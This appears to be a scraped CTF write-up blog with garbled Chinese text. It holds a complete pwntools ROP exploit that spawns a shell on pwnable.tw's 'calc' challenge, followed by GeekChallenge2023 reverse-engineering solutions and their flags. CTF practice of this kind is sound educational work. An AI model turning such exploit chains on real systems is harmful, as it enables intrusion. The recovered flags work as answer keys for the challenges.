<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10100</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481d1</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701d1</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049a21</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">361</span>, <span class="number">361</span> + <span class="built_in">int</span>(<span class="built_in">len</span>(payload) / <span class="number">4</span>)):</span><br><span class="line"></span><br><span class="line">	sl(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	value = <span class="built_in">int</span>(r())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> value &gt; <span class="number">0</span>:</span><br><span class="line">		payload2 = <span class="string">f&#x27;+<span class="subst">&#123;i&#125;</span>-<span class="subst">&#123;value&#125;</span>+<span class="subst">&#123;u32(payload[(i - <span class="number">361</span>) * <span class="number">4</span>:(i - <span class="number">361</span> + <span class="number">1</span>) * <span class="number">4</span>])&#125;</span>&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload2 = <span class="string">f&#x27;+<span class="subst">&#123;i&#125;</span>+<span class="subst">&#123;-value&#125;</span>+<span class="subst">&#123;u32(payload[(i - <span class="number">361</span>) * <span class="number">4</span>:(i - <span class="number">361</span> + <span class="number">1</span>) * <span class="number">4</span>])&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">	sl(payload2)</span><br><span class="line">	</span><br><span class="line">	r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 2715 words, 9 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a></h3></div><div class="post-content"><div class="card"><p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"><a href="#ç‚¹å‡»å°±é€çš„é€†å‘é¢˜" class="headerlink" title="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"></a>ç‚¹å‡»å°±é€çš„é€†å‘é¢˜</h2><p>.Sçš„æ–‡ä»¶ ä½¿ç”¨aså‘½ä»¤æ¥æ±‡ç¼–ä¸€ä¸‹ï¼Œç„¶åidaæ‰“å¼€åˆ†æé€»è¾‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as -o output.o input.S</span><br></pre></td></tr></table></figure>

<p>ç½®åä¸€ä¸‹é€»è¾‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">  _isoc99_scanf(&amp;unk_F4, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    s1[i] += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = <span class="built_in">ord</span>(flag[i]) - <span class="number">7</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h2><p>æœ‰ä¸ªjmpçš„èŠ±æŒ‡ä»¤ nopæ‰åï¼Œå¯¹ç€main u p é‡æ–°æ‰“åŒ…mainå‡½æ•°åç¼–è¯‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">33</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( rodata[i] ^ i ^ getchar() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0x53</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x54</span>, <span class="number">0x78</span>, <span class="number">0x42</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x61</span>, <span class="number">0x27</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x45</span>, <span class="number">0x2D</span>, <span class="number">0x7C</span>, <span class="number">0x45</span>, <span class="number">0x6C</span>, <span class="number">0x2C</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x7B</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = flag[i] ^ i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="å¹¸è¿æ•°å­—"><a href="#å¹¸è¿æ•°å­—" class="headerlink" title="å¹¸è¿æ•°å­—"></a>å¹¸è¿æ•°å­—</h2><p>è¿™é‡Œçš„é—®é¢˜ï¼Œå…¶å®æ˜¯æ±‚è§£ æ‰¾0xD3èŒƒå›´å†…çš„iå¼‚æˆ–cmpæ•°ç»„ å“ªä¸ªå¼€å¤´æ˜¯SYCï¼Œå› ä¸ºä¸è¿ç®—æœ‰æˆªæ–­è¿™ä¸ªç‰¹æ€§ï¼Œæ‰€ä»¥èŒƒå›´æ˜¯0xD3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 cmp_data[<span class="number">41</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> inputString; <span class="comment">// [rsp+54h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> lenth; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  qmemcpy(cmp_data, <span class="string">&quot;\r\a&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  cmp_data[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">  cmp_data[<span class="number">3</span>] = <span class="number">37</span>;</span><br><span class="line">  cmp_data[<span class="number">4</span>] = <span class="number">29</span>;</span><br><span class="line">  cmp_data[<span class="number">5</span>] = <span class="number">110</span>;</span><br><span class="line">  cmp_data[<span class="number">6</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">7</span>] = <span class="number">57</span>;</span><br><span class="line">  cmp_data[<span class="number">8</span>] = <span class="number">44</span>;</span><br><span class="line">  cmp_data[<span class="number">9</span>] = <span class="number">63</span>;</span><br><span class="line">  cmp_data[<span class="number">10</span>] = <span class="number">42</span>;</span><br><span class="line">  cmp_data[<span class="number">11</span>] = <span class="number">43</span>;</span><br><span class="line">  cmp_data[<span class="number">12</span>] = <span class="number">50</span>;</span><br><span class="line">  cmp_data[<span class="number">13</span>] = <span class="number">63</span>;</span><br><span class="line">  cmp_data[<span class="number">14</span>] = <span class="number">42</span>;</span><br><span class="line">  cmp_data[<span class="number">15</span>] = <span class="number">55</span>;</span><br><span class="line">  cmp_data[<span class="number">16</span>] = <span class="number">110</span>;</span><br><span class="line">  cmp_data[<span class="number">17</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">18</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">19</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">20</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">21</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">22</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">23</span>] = <span class="number">7</span>;</span><br><span class="line">  cmp_data[<span class="number">24</span>] = <span class="number">49</span>;</span><br><span class="line">  cmp_data[<span class="number">25</span>] = <span class="number">43</span>;</span><br><span class="line">  cmp_data[<span class="number">26</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">27</span>] = <span class="number">57</span>;</span><br><span class="line">  cmp_data[<span class="number">28</span>] = <span class="number">31</span>;</span><br><span class="line">  cmp_data[<span class="number">29</span>] = <span class="number">59</span>;</span><br><span class="line">  cmp_data[<span class="number">30</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">31</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">32</span>] = <span class="number">27</span>;</span><br><span class="line">  cmp_data[<span class="number">33</span>] = <span class="number">58</span>;</span><br><span class="line">  cmp_data[<span class="number">34</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">35</span>] = <span class="number">12</span>;</span><br><span class="line">  qmemcpy(&amp;cmp_data[<span class="number">36</span>], <span class="string">&quot;o96*#&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;inputString);</span><br><span class="line">  <span class="keyword">if</span> ( inputString &lt;= <span class="number">0x3E7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lenth = <span class="number">41</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;Buffer);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenth; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = cmp_data[i];</span><br><span class="line">      v5 = result(inputString);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4 ^ (v5 % <span class="number">0xD3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_40401C);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp_data = [<span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x1D</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x2C</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x32</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x2D</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x01</span>, <span class="number">0x39</span>, <span class="number">0x1F</span>, <span class="number">0x3B</span>, <span class="number">0x2D</span>, <span class="number">0x2D</span>, <span class="number">0x1B</span>, <span class="number">0x3A</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x6F</span>, <span class="number">0x39</span>, <span class="number">0x36</span>, <span class="number">0x2A</span>, <span class="number">0x23</span>, <span class="number">0x15</span>, <span class="number">0x40</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> cmp_data:</span><br><span class="line">        byte = j ^ i;</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="ç æ ‘"><a href="#ç æ ‘" class="headerlink" title="ç æ ‘"></a>ç æ ‘</h2><p>native çœ‹ä¸‹é¢è°ƒç”¨str2åº”è¯¥æ˜¯key</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">I0o0I</span><span class="params">(String str, String str2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">skkkyJNI</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;ezreeeee&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ ¹æ®è¾“å…¥å’Œkeyè¿›è¡ŒåŠ å¯†ç„¶åå’Œdest cmpï¼Œå¤§æ¦‚æ˜¯è¿™æ ·çš„ä¸€ä¸ªé€»è¾‘</p>
